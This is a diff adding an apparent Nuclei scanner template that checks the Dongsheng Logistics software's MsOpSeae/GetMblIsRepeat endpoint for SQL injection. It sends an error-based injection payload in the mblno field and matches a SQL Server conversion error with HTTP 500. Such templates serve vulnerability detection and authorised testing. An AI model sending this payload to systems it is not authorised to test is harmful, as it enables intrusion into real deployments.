@@ -1,0 +1,27 @@
+id: dongshengwuliu-MsOpSeae-GetMblIsRepeat-sql
+
+info:
+  name: 东胜物流软件 MsOpSeaeController 存在SQL注入漏洞
+  author: dongshengwuliu
+  severity: high
+  tags: dongshengwuliu,sql
+
+http:
+  - raw:
+      - |
+        POST /MvcShipping/MsOpSeae/GetMblIsRepeat HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        Content-Type: application/x-www-form-urlencoded
+
+        bsno=1&mblno=1'and 1<@@VERSION--+-
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+      - type: status
+        status: 
+          - 500
